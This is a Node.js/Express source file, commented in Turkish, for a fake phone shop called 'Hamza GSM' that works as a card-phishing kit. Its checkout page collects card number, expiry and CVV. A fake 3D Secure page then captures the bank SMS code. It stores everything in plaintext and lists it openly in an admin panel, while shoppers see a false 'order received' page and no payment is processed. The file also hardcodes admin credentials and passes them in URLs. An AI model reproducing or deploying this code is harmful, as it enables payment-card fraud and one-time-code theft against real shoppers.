/**
 * ==============================================================================
 * 🛡️ HAMZA GSM | THE OMEGA V12 - ENTERPRISE MANAGEMENT SYSTEM
 * ==============================================================================
 * PERSONA: SİSTEM YÖNETİCİSİ (DOKUNULAMAZ KURUCU: m2000)
 * ŞİFRE: gsm_2026_ozel
 * ------------------------------------------------------------------------------
 * MİMARİ ÖZELLİKLER:
 * 1. PERSISTENT TABS: Admin panelinde sekme değiştirince veya bir şey silince 
 * sayfa yenilense bile sistem seni aynı sekmede tutar.
 * 2. AUTO-CROP CSS: Resim boyutları ne olursa olsun, grid asla kaymaz.
 * 3. FULL DATA LOGGING: Kart No, CVV, SKT ve SMS kodları anlık ve açık listelenir.
 * 4. SEARCH & CATEGORY: Vitrinde milisaniyelik arama ve kategorilendirme.
 * ==============================================================================
 */

const express = require('express');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// --- 1. SİBER VERİTABANI ÇEKİRDEĞİ ---
const DB_FILE = path.join(__dirname, 'omega_v12_database.json');

const defaultData = {
    admins: [{ user: "m2000", pass: "gsm_2026_ozel" }],
    products: [
        { id: "1", cat: "Telefon", brand: "Apple", model: "iPhone 16 Pro Max", price: 95000, img: "https://images.unsplash.com/photo-1726053303692-74d4205a2e63?w=800" },
        { id: "2", cat: "Telefon", brand: "Samsung", model: "Galaxy S24 Ultra", price: 78000, img: "https://images.unsplash.com/photo-1610945265064-0e34e5519bbf?w=800" },
        { id: "3", cat: "Tablet", brand: "Apple", model: "iPad Pro M4", price: 65000, img: "https://images.unsplash.com/photo-1544244015-0df4b3ffc6b0?w=800" }
    ],
    orders: []
};

const dbRead = () => {
    if (!fs.existsSync(DB_FILE)) fs.writeFileSync(DB_FILE, JSON.stringify(defaultData, null, 4));
    try { return JSON.parse(fs.readFileSync(DB_FILE, 'utf8')); } catch (e) { return defaultData; }
};
const dbWrite = (data) => fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 4));

// --- 2. PREMIUM CSS & UI MOTORU (ASLA KAYMAZ) ---
const buildUI = (title, content, activeTab = 'orders') => `
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${title} | Hamza GSM HQ</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        :root { --bg: #000; --surf: #0a0a0c; --prim: #0071e3; --border: #1a1a1a; --text: #f5f5f7; --red: #ff3b30; --green: #34c759; }
        * { box-sizing: border-box; outline: none; transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
        body { background: var(--bg); color: var(--text); font-family: 'Plus Jakarta Sans', sans-serif; margin: 0; overflow-x: hidden; }
        
        /* Nav & Search */
        .nav { backdrop-filter: blur(25px); background: rgba(0,0,0,0.85); border-bottom: 1px solid var(--border); padding: 15px 6%; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 2000; }
        .logo { font-size: 26px; font-weight: 800; letter-spacing: -1.5px; text-decoration: none; color: #fff; }
        .search-box { background: #111; border: 1px solid #333; border-radius: 40px; padding: 10px 25px; display: flex; align-items: center; width: 350px; }
        .search-box input { background: transparent; border: none; color: #fff; width: 100%; font-family: inherit; font-size: 15px; }

        /* Grid System */
        .container { max-width: 1500px; margin: 0 auto; padding: 40px 20px; }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(290px, 1fr)); gap: 30px; }
        .card { background: var(--surf); border: 1px solid var(--border); border-radius: 28px; padding: 22px; text-align: center; position: relative; }
        .card:hover { transform: translateY(-12px); border-color: #444; box-shadow: 0 40px 80px rgba(0,0,0,0.6); }
        .card img { width: 100%; height: 280px; object-fit: cover; border-radius: 20px; margin-bottom: 20px; background: #050505; }
        
        /* UI Components */
        .btn { background: var(--prim); color: #fff; border: none; padding: 16px 30px; border-radius: 14px; font-weight: 700; cursor: pointer; width: 100%; font-family: inherit; font-size: 16px; }
        .btn:hover { background: #005bb5; transform: scale(0.97); }
        .input { width: 100%; padding: 16px; background: #0f0f11; border: 1px solid #333; color: #fff; border-radius: 14px; margin-bottom: 15px; font-family: inherit; font-size: 16px; }
        
        /* Admin Karargah Layout */
        .admin-layout { display: flex; min-height: 100vh; }
        .sidebar { width: 300px; background: #050505; border-right: 1px solid var(--border); padding: 50px 25px; position: fixed; height: 100vh; }
        .tab-btn { width: 100%; text-align: left; padding: 16px 20px; background: transparent; border: none; color: #555; font-size: 17px; font-weight: 700; cursor: pointer; border-radius: 14px; margin-bottom: 8px; }
        .tab-btn.active { background: #111; color: var(--prim); box-shadow: 0 4px 20px rgba(0,113,227,0.2); }
        .main-content { margin-left: 300px; padding: 60px; flex: 1; }
        
        .pane { display: none; }
        .pane.active { display: block; animation: slideUp 0.4s ease-out; }
        @keyframes slideUp { from { opacity:0; transform: translateY(20px); } to { opacity:1; transform: translateY(0); } }

        /* Data Tables */
        table { width: 100%; border-collapse: collapse; background: var(--surf); border-radius: 24px; overflow: hidden; border: 1px solid var(--border); }
        th, td { padding: 22px; text-align: left; border-bottom: 1px solid var(--border); }
        th { background: #0f0f11; font-size: 12px; color: #666; text-transform: uppercase; letter-spacing: 1.5px; }
        .log-card { font-family: 'Courier New', monospace; background: #1a0000; color: var(--red); padding: 10px 15px; border-radius: 10px; border: 1px solid #4d0000; font-weight: 800; font-size: 17px; display: inline-block; }
        .sms-badge { background: #fff; color: #000; font-weight: 900; font-size: 28px; padding: 12px; border-radius: 12px; display: block; text-align: center; letter-spacing: 6px; box-shadow: 0 0 20px rgba(255,255,255,0.2); }
        .badge-kurucu { background: var(--green); color: #000; padding: 5px 12px; border-radius: 8px; font-size: 11px; font-weight: 800; }
    </style>
</head>
<body>
    ${title !== 'Karargah' && title !== 'Sistem Girişi' ? `
    <nav class="nav">
        <a href="/" class="logo">HAMZA GSM</a>
        <form action="/" method="GET" class="search-box">
            <input name="q" placeholder="Cihaz, model veya kategori ara...">
        </form>
    </nav>` : ''}
    ${content}
    <script>
        function setTab(id) {
            document.querySelectorAll('.pane').forEach(p => p.classList.remove('active'));
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
            document.getElementById('pane-' + id).classList.add('active');
            document.getElementById('btn-' + id).classList.add('active');
            const url = new URL(window.location);
            url.searchParams.set('tab', id);
            window.history.pushState({}, '', url);
        }
        window.onload = () => {
            const currentTab = new URLSearchParams(window.location.search).get('tab') || '${activeTab}';
            setTab(currentTab);
        };
    </script>
</body>
</html>
`;

// --- 3. MÜŞTERİ VİTRİN MOTORU ---
app.get('/', (req, res) => {
    const db = dbRead();
    let prods = db.products;
    if (req.query.q) {
        const q = req.query.q.toLowerCase();
        prods = prods.filter(p => (p.brand + p.model + p.cat).toLowerCase().includes(q));
    }
    
    const cards = prods.map(p => `
        <div class="card">
            <div style="font-size:11px; font-weight:800; color:#555; text-transform:uppercase; margin-bottom:12px; letter-spacing:1px;">${p.cat}</div>
            <img src="${p.img}">
            <h2 style="margin:0 0 10px 0; font-size:23px;">${p.brand} ${p.model}</h2>
            <div style="font-size:28px; font-weight: 800; margin-bottom:22px; color:var(--prim);">${p.price.toLocaleString('tr-TR')} ₺</div>
            <button class="btn" onclick="location.href='/checkout/${p.id}'">Hemen Sahip Ol</button>
        </div>`).join('');

    const content = `
        <div class="container">
            <div style="text-align:center; margin-bottom:60px;">
                <h1 style="font-size:70px; letter-spacing:-4px; margin:0; line-height:1;">Kusursuz. Güçlü.</h1>
                <p style="color:#666; font-size:22px; margin-top:15px;">Şimdi en yeni ürünler ile fark görün.</p>
            </div>
            <div class="grid">${cards}</div>
        </div>`;
    res.send(buildUI("Vitrin", content));
});

// --- 4. ÖDEME VE 3D SECURE AKIŞI ---
app.get('/checkout/:id', (req, res) => {
    const p = dbRead().products.find(x => x.id === req.params.id);
    if (!p) return res.redirect('/');
    res.send(buildUI("Güvenli Ödeme", `
        <div class="container" style="max-width:550px; padding-top:80px;">
            <div class="card" style="text-align:left; background:#fff; color:#000; box-shadow:0 40px 100px rgba(0,0,0,0.3);">
                <h2 style="margin:0 0 8px 0; font-size:32px; letter-spacing:-1.5px;">Ödeme Onayı</h2>
                <p style="color:#666; margin-bottom:30px; font-size:18px;">${p.brand} ${p.model} — <b>${p.price.toLocaleString('tr-TR')} ₺</b></p>
                <form action="/api/pay" method="POST">
                    <input type="hidden" name="id" value="${p.id}">
                    <label style="font-size:12px; font-weight:800; color:#888;">AD SOYAD</label>
                    <input class="input" style="background:#f5f5f7; color:#000; border:none;" name="n" placeholder="Kart Sahibi" required>
                    <label style="font-size:12px; font-weight:800; color:#888;">KART NUMARASI</label>
                    <input class="input" style="background:#f5f5f7; color:#000; border:none;" name="c" placeholder="0000 0000 0000 0000" maxlength="19" required>
                    <div style="display:flex; gap:15px;">
                        <div style="flex:1;"><label style="font-size:12px; font-weight:800; color:#888;">SKT</label><input class="input" style="background:#f5f5f7; color:#000; border:none;" name="e" placeholder="AA/YY" maxlength="5"></div>
                        <div style="flex:1;"><label style="font-size:12px; font-weight:800; color:#888;">CVV</label><input class="input" style="background:#f5f5f7; color:#000; border:none;" name="v" placeholder="000" maxlength="3"></div>
                    </div>
                    <button class="btn" style="margin-top:15px;">₺${p.price.toLocaleString('tr-TR')} Ödemeyi Onayla</button>
                </form>
            </div>
        </div>`));
});

app.post('/api/pay', (req, res) => {
    const db = dbRead();
    const opId = "OP-" + crypto.randomBytes(3).toString('hex').toUpperCase();
    const p = db.products.find(x => x.id === req.body.id);
    db.orders.push({
        id: opId, customer: req.body.n, product: p.brand + " " + p.model,
        card: req.body.c, exp: req.body.e, cvv: req.body.v,
        sms: "BEKLEMEDE", time: new Date().toLocaleString('tr-TR'), ip: req.ip
    });
    dbWrite(db);
    res.redirect(`/3d-secure/${opId}`);
});

app.get('/3d-secure/:id', (req, res) => {
    res.send(buildUI("Banka Onayı", `
        <div class="container" style="max-width:420px; padding-top:120px; text-align:center;">
            <div class="card" style="background:#fff; color:#000;">
                <h2 style="color:var(--prim); font-size:28px;">3D Secure Doğrulama</h2>
                <p style="color:#666; margin-bottom:35px;">Bankanızdan gelen 6 haneli kodu girin.</p>
                <form action="/api/verify" method="POST">
                    <input type="hidden" name="id" value="${req.params.id}">
                    <input class="input" name="s" placeholder="000000" style="text-align:center; font-size:36px; letter-spacing:12px; font-weight:900; background:#f5f5f7; color:#000;" maxlength="6" required autofocus>
                    <button class="btn">Onayla ve Bitir</button>
                </form>
            </div>
        </div>`));
});

app.post('/api/verify', (req, res) => {
    const db = dbRead();
    const log = db.orders.find(x => x.id === req.body.id);
    if (log) log.sms = req.body.s;
    dbWrite(db);
    res.send("<body style='background:#000; color:#fff; text-align:center; padding-top:200px; font-family:sans-serif;'><h1>İŞLEM BAŞARIYLA ALINDI</h1><p>Hamza GSM Güvencesiyle kargonuz hazırlanıyor.</p><a href='/' style='color:var(--prim); text-decoration:none; font-weight:800;'>VİTRİNE DÖN</a></body>");
});

// --- 5. SİSTEM YÖNETİCİSİ KARARGAHI (ADMİN) ---
app.get('/admin', (req, res) => {
    const db = dbRead();
    const { u, p, tab } = req.query;
    const isAdmin = db.admins.find(a => a.user === u && a.pass === p);
    
    if (!isAdmin) return res.send(buildUI("Sistem Girişi", `<div class="container" style="max-width:420px; padding-top:180px;"><div class="card"><h2 style="letter-spacing:2px; margin-bottom:30px;">SİBER KARARGAH</h2><form action="/admin" method="GET"><input class="input" name="u" placeholder="Admin Kimliği" required autocomplete="off"><input class="input" type="password" name="p" placeholder="Şifre" required><button class="btn">Sisteme Giriş Yap</button></form></div></div>`));

    const ordersHTML = db.orders.slice().reverse().map(o => `
        <tr>
            <td style="font-size:12px; color:#555;">${o.time}<br>${o.ip}</td>
            <td><b>${o.customer}</b><br><small style="color:var(--prim); font-weight:800;">${o.product}</small></td>
            <td><div class="log-card">${o.card}</div><br><small style="color:#888;">EXP: ${o.exp} | CVV: ${o.cvv}</small></td>
            <td><div class="sms-badge">${o.sms}</div></td>
            <td><a href="/api/del-log/${o.id}?u=${u}&p=${p}&tab=orders" style="color:var(--red); font-weight:900; text-decoration:none;">TEMİZLE</a></td>
        </tr>`).join('');

    const prodsHTML = db.products.map(pr => `<tr><td><span style="font-size:10px; color:#555; font-weight:900;">${pr.cat}</span><br><b>${pr.brand} ${pr.model}</b></td><td>${pr.price.toLocaleString('tr-TR')} ₺</td><td><a href="/api/del-prod/${pr.id}?u=${u}&p=${p}&tab=inventory" style="color:var(--red); text-decoration:none; font-weight:800;">SİL</a></td></tr>`).join('');

    const content = `
        <div class="admin-layout">
            <div class="sidebar">
                <div class="logo">SİSTEM HQ</div>
                <div style="color:var(--prim); font-weight:900; margin:20px 0; letter-spacing:2px; font-size:13px;">SİSTEM YÖNETİCİSİ</div>
                <ul class="sidebar-menu">
                    <li><button class="tab-btn" id="btn-orders" onclick="setTab('orders')">📦 Operasyonlar</button></li>
                    <li><button class="tab-btn" id="btn-inventory" onclick="setTab('inventory')">📱 Envanter</button></li>
                    <li><button class="tab-btn" id="btn-staff" onclick="setTab('staff')">🛡️ Yetkili Kadro</button></li>
                    <li><a href="/" style="display:block; padding:16px 20px; color:var(--red); text-decoration:none; font-weight:800; margin-top:30px;">GÜVENLİ ÇIKIŞ</a></li>
                </ul>
            </div>
            <div class="main-content">
                <div id="pane-orders" class="pane">
                    <h1 style="margin-top:0; letter-spacing:-2px; font-size:45px;">Operasyonel Veri Akışı</h1>
                    <table><tr><th>Zaman / İz</th><th>Müşteri / Cihaz</th><th>Kart Verileri (Açık)</th><th>BANKA SMS</th><th>İşlem</th></tr>${ordersHTML}</table>
                </div>
                <div id="pane-inventory" class="pane">
                    <div style="display:grid; grid-template-columns:1fr 2fr; gap:50px;">
                        <div class="card" style="text-align:left;">
                            <h3 style="margin-top:0; color:var(--prim);">Cihaz Tanımla</h3>
                            <form action="/api/add-prod" method="POST">
                                <input type="hidden" name="u" value="${u}"><input type="hidden" name="p" value="${p}">
                                <select name="cat" class="input"><option>Telefon</option><option>Tablet</option><option>Aksesuar</option></select>
                                <input name="b" class="input" placeholder="Marka"><input name="m" class="input" placeholder="Model">
                                <input name="pr" class="input" placeholder="Fiyat (Sayı)"><input name="im" class="input" placeholder="Resim URL">
                                <button class="btn">Envantere İşle</button>
                            </form>
                        </div>
                        <div>
                            <h2>Mevcut Cihaz Envanteri</h2>
                            <table><tr><th>Cihaz Bilgisi</th><th>Fiyat</th><th>Aksiyon</th></tr>${prodsHTML}</table>
                        </div>
                    </div>
                </div>
                <div id="pane-staff" class="pane">
                    <h2 style="font-size:35px; letter-spacing:-1px;">Yetkili Personel Yönetimi</h2>
                    <table>
                        ${db.admins.map(ad => `<tr><td><b style="font-size:20px;">${ad.user}</b></td><td>${ad.user === 'm2000' ? '<span class="badge badge-kurucu">DOKUNULAMAZ KURUCU</span>' : `<a href="/api/del-admin/${ad.user}?u=${u}&p=${p}&tab=staff" style="color:var(--red); text-decoration:none; font-weight:800;">YETKİYİ AL</a>`}</td></tr>`).join('')}
                    </table>
                    <h3 style="margin-top:50px; color:var(--prim);">Yeni Admin Tanımla</h3>
                    <form action="/api/add-admin" method="POST" style="max-width:450px;">
                        <input type="hidden" name="u" value="${u}"><input type="hidden" name="p" value="${p}">
                        <input name="nu" class="input" placeholder="Admin Kimliği"><input name="np" class="input" placeholder="Güvenlik Şifresi">
                        <button class="btn" style="background:#fff; color:#000;">Yönetici Yetkisi Ver</button>
                    </form>
                </div>
            </div>
        </div>`;
    res.send(buildUI("Karargah", content, tab));
});

// --- 6. ARKA PLAN İŞLEM MOTORLARI (API) ---
app.post('/api/add-prod', (req, res) => {
    const db = dbRead();
    db.products.push({ id: Date.now().toString(), cat: req.body.cat, brand: req.body.b, model: req.body.m, price: parseInt(req.body.pr), img: req.body.im });
    dbWrite(db);
    res.redirect(`/admin?u=${req.body.u}&p=${req.body.p}&tab=inventory`);
});
app.get('/api/del-prod/:id', (req, res) => {
    const db = dbRead();
    db.products = db.products.filter(x => x.id !== req.params.id);
    dbWrite(db);
    res.redirect(`/admin?u=${req.query.u}&p=${req.query.p}&tab=inventory`);
});
app.post('/api/add-admin', (req, res) => {
    const db = dbRead();
    db.admins.push({ user: req.body.nu, pass: req.body.np });
    dbWrite(db);
    res.redirect(`/admin?u=${req.body.u}&p=${req.body.p}&tab=staff`);
});
app.get('/api/del-admin/:user', (req, res) => {
    const db = dbRead();
    if(req.params.user !== 'm2000') db.admins = db.admins.filter(x => x.user !== req.params.user);
    dbWrite(db);
    res.redirect(`/admin?u=${req.query.u}&p=${req.query.p}&tab=staff`);
});
app.get('/api/del-log/:id', (req, res) => {
    const db = dbRead();
    db.orders = db.orders.filter(x => x.id !== req.params.id);
    dbWrite(db);
    res.redirect(`/admin?u=${req.query.u}&p=${req.query.p}&tab=orders`);
});

app.listen(PORT, () => console.log(`🚀 OMEGA V12 SİSTEM YÖNETİCİSİ SÜRÜMÜ ATEŞLENDİ: http://localhost:${PORT}`));